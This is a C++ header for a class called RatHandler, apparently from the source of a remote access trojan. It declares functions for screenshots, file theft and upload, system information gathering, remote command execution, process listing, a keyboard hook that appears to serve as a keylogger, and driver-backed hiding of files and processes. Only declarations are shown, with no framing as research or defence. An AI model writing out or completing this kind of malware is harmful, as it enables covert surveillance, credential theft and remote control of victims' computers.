#pragma once

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Winsock2.h>
#include <windows.h>  
#include <TlHelp32.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <conio.h>
#include <string.h>
#include <lm.h>
#include "common.h"
#include "DriverHandler.h"

#define MAXLEN 20000

#define RECV_BUFLEN MAXLEN
#define SEND_BUFLEN MAXLEN
#define KEY_BUFLEN 30
#define CMD_BUFLEN MAXLEN
#define INFO_BUFLEN 100

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")

class RatHandler
{
public:
	RatHandler(char* remote_server_ip, int length, unsigned int remote_server_port);
	~RatHandler();

	bool getScreenShot(const wchar_t *path);

	bool hideFile(const wchar_t *path);

	bool sendFile(const char *path);

	bool getFile(const char *path);

	bool sendSystemInfo();

	bool popMsgBox(const char *msg);

	bool getCurrentProcesses(char *buf, const unsigned int buflen);

	bool runCommand(char *cmdStr);

	bool dealWithCommand(char *sendBuf, char *recvBuf, int recvLen);

	unsigned int readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen);

	static int send_s(SOCKET& socket_handle, const char *buf, int sendlen);

	static int recv_s(SOCKET& socket_handle, char *buf, unsigned int buflen);

	void acceptConnection();

	bool runRatServer(unsigned int 
	);

	bool runRatClient();

	bool hideProcess(const char *pid);

	char* remote_server_ip;
	int remote_server_ip_length;
	unsigned int remote_server_port;

	static bool InitWSA();

	SOCKET ratServer;
	SOCKET ratClient;
	SOCKET clientManager;

	HANDLE* hDriver = nullptr;

	DriverHandler* hDriverHandler = nullptr;
};


DWORD WINAPI ThreadProc(LPVOID lpThreadParameter);

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

DWORD WINAPI updateRemoteServer(LPVOID lpParameter);